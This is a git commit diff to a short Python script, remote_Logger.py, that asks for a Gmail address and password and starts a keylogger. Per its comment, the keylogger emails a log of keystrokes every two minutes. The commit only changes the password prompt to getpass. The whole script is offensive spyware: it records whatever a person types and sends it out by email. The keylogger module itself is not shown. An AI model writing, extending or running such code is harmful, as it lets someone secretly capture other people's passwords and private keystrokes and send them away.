398e45b588fd7ec068d3060dec9a4a131500207d
Jonscott92 <62578437+Jonscott92@users.noreply.github.com>
2020-05-07 21:06:02 -0400

    Update remote_Logger.py

--- remote_Logger.py
+++ remote_Logger.py
@@ -1,8 +1,9 @@
 #!/usr/bin/python
 import keylogger
+import getpass
 #user input for google email and password.
 email_address = input(str("Enter a gmail account: "))
-email_password = input(str("Enter password: "))
+email_password = getpass.getpass('Password: ')
 #keylogger that uses email and password entered then sends a log of keystrokes every 2 minutes
 my_keylogger = keylogger.Keylogger(email=email_address, password=email_password, time_interval=120)
 my_keylogger.start_logging()
